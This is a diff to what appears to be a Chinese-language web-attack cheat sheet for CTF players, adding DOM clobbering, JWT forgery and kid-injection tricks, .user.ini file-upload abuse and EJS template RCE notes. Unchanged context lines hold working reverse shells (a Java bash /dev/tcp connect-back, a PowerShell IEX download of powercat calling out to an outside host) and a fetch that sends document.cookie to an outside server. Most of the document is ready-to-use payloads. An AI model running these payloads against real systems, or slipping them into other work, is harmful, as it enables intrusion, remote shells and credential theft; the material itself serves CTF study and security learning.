@@ -51,11 +51,13 @@ Table of Contents
 *  [XXE](#xxe)
     * [Out of Band XXE](#out-of-band-oob-xxe)
     * [Error-based XXE](#error-based-xxe)
+*  [Prototype Pollution](#prototype-pollution)
 *  [Frontend](#frontend)
     * [XSS](#xss)
     * [RPO](#rpo)
     * [CSS Injection](#css-injection)
     * [XS-Leaks](#xs-leaks)
+    * [DOM Clobbering](#dom-clobbering)
 *  [Crypto](#密碼學)
     * [PRNG](#prng)
     * [ECB mode](#ecb-mode)
@@ -269,6 +271,7 @@ if("kaibro".equals(request.getParameter("pwd"))) {
 
 - Java
     - `Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/kaibro.tw/5278;cat <&5 | while read line; do $line 2>&5 >&5; done"});p.waitFor();`
+    - `java.lang.Runtime.exec()` payload generator: http://www.jackson-t.ca/runtime-exec-payloads.html
 
 - Powershell
     - `powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c kaibro.tw -p 5566 -e cmd`
@@ -2030,6 +2033,14 @@ HQL injection example (pwn2win 2017)
     SetHandler application/x-httpd-php
     </FilesMatch>
     ```
+
+- .user.ini
+    - 只要 fastcgi 運行的 php 都適用 (nginx/apache/iis)
+    - 用戶自定義的設定檔
+        - 可以設置 `PHP_INI_PERDIR` 和 `PHP_INI_USER` 的設定
+        - 可以動態載入，不用重啟
+    - 使用前提: 該目錄下必須有php文件
+    - `auto_prepend_file=test.jpg`
 - 文件解析漏洞
 - NTFS ADS
     - `test.php:a.jpg`
@@ -2943,6 +2954,10 @@ console.log(o3.b)
     - `outputFunctionName`
     - 直接拼接到模板執行
     - 污染即可RCE: `Object.prototype.outputFunctionName = "x;process.mainModule.require('child_process').exec('touch pwned');x";`
+    - 補充: 不需要Prototype Pollution的RCE (ejs render誤用)
+        - 漏洞成因: `res.render('index.ejs', req.body);`
+        - `req.body` 會污染到 `options` 進而污染到 `outputFunctionName` (HPP)
+        - Example: [AIS3 EOF 2019 Quals - echo](https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo)
 
 # Frontend
 
@@ -3255,6 +3270,77 @@ fetch('http://orange.tw/?' + escape(document.cookie))
     - 有 cache => 顯示資源
     - 沒 cache => 抓不到資源
 
+## DOM Clobbering
+
+```html
+<form id=test1></form>
+<form name=test2></form>
+
+<script>
+console.log(test1); // <form id=test1></form>
+console.log(test2); // <form name=test2></form>
+console.log(document.test1); // undefined
+console.log(document.test2); // <form name=test2></form>
+</script>
+```
+
+- `id` 屬性被當成全域變數
+- `name` 屬性被當成 `document` 屬性
+- 覆蓋原生函數
+
+```html
+<form name="getElementById"></form>
+<form id="form"></form>
+
+<script>
+console.log(document.getElementById("form"));  // Error 
+</script>
+
+<script>
+console.log("I'll be executed!");
+</script>
+```
+
+這裡第一個script block因為錯誤被跳過，第二個script block依舊會執行 (常拿來繞檢查)
+
+- toString 問題
+
+```html
+<form id=test1><input name=test2></form>
+<script>
+  alert(test1.test2); // "[object HTMLInputElement]"
+</script>
+```
+
+    - `<a>` 的 `href` 可以解決toString問題: `<a id=test1 href=http://kaibro.tw>`
+        - => `alert(test1); // http://kaibro.tw`
+    - `<form id=test1><a name=test2 href=http://kaibro.tw></form>` 依舊有問題
+        - => `alert(test1.test2); // undefined`
+        - 解法見下面HTMLCollection
+
+- HTMLCollection
+
+```html
+<a id=test1>click!</a>
+<a id=test1>click2!</a>
+<script>
+console.log(window.test1);  //  <HTMLCollection(2) [a#test1, a#test1, test1: a#test1]
+</script>
+```
+
+`name` 屬性也會直接變成 `HTMLCollection` 的屬性:
+
+```html
+<a id="test1"></a>
+<a id="test1" name="test2" href="x:alert(1)"></a>
+<script>
+alert(window.test1.test2);  //  x:alert(1)
+</script>
+```
+
+- Example
+    - [Volga CTF 2020 Qualifier - Archive](https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html)
+
 # 密碼學
 
 ## PRNG
@@ -3412,6 +3498,36 @@ state[i] = state[i-3] + state[i-31]`
         - Tool 
             - https://andresriancho.github.io/nimbostratus/
 
+- JWT (Json Web Token)
+    - 重置算法 None
+        - `import jwt; print(jwt.encode({"userName":"admin","userRoot":1001}, key="", algorithm="none"))[:-1]`
+    - 降級算法
+        - 把"非對稱式加密"降級為"對稱式加密"
+        - e.g. RS256 改成 HS256
+
+        ```python
+        import jwt
+        public = open('public.pem', 'r').read()   # public key
+        prin(jwt.encode({"user":"admin","id":1}, key=public, algorithm='HS256'))
+        ```
+
+    - 暴力破解密鑰
+        - Tool: [JWT Cracker](https://github.com/brendan-rius/c-jwt-cracker)
+            - usage: `./jwtcrack eyJhbGci....`
+    - kid 參數 (key ID)
+        - 是一個可選參數
+        - 用於指定加密算法的密鑰
+        - 任意文件讀取
+            - `"kid" : "/etc/passwd"`
+        - SQL注入
+            - kid 有可能從資料庫提取數據
+            - `"kid" : "key11111111' || union select 'secretkey' -- "`
+        - Command Injection
+            - Ruby open: `"/path/to/key_file|whoami"`
+    - 敏感訊息洩漏
+        - JWT 是保證完整性而不是保證機密性
+        - base64 decode 後即可得到 payload 內容
+
 - 常見Port服務
     - http://packetlife.net/media/library/23/common_ports.pdf
 - `php -i | grep "Loaded Configuration File"`
@@ -3431,6 +3547,7 @@ state[i] = state[i-3] + state[i-31]`
 - X-forwarded-for 偽造來源IP
     - Client-IP
     - X-Client-IP
+    - X-Real-IP
     - X-Remote-IP
     - X-Remote-Addr
     - X-Host
@@ -3666,7 +3783,9 @@ state[i] = state[i-3] + state[i-31]`
           ```
   - rbndr.us
       - `36573657.7f000001.rbndr.us`
-  - e.g. [BalsnCTF 2019 - 卍乂Oo韓國魚oO乂卍](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2019#%E5%8D%8D%E4%B9%82oo%E9%9F%93%E5%9C%8B%E9%AD%9Aoo%E4%B9%82%E5%8D%8D-koreanfish)
+  - Example
+      - [BalsnCTF 2019 - 卍乂Oo韓國魚oO乂卍](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2019#%E5%8D%8D%E4%B9%82oo%E9%9F%93%E5%9C%8B%E9%AD%9Aoo%E4%B9%82%E5%8D%8D-koreanfish)
+      - [DEFCON CTF 2019 Qual - ooops](https://balsn.tw/ctf_writeup/20190513-defconctfqual/#solution-2:-dns-rebinding)
 
 - https://r12a.github.io/apps/encodings/
     - Encoding converter 
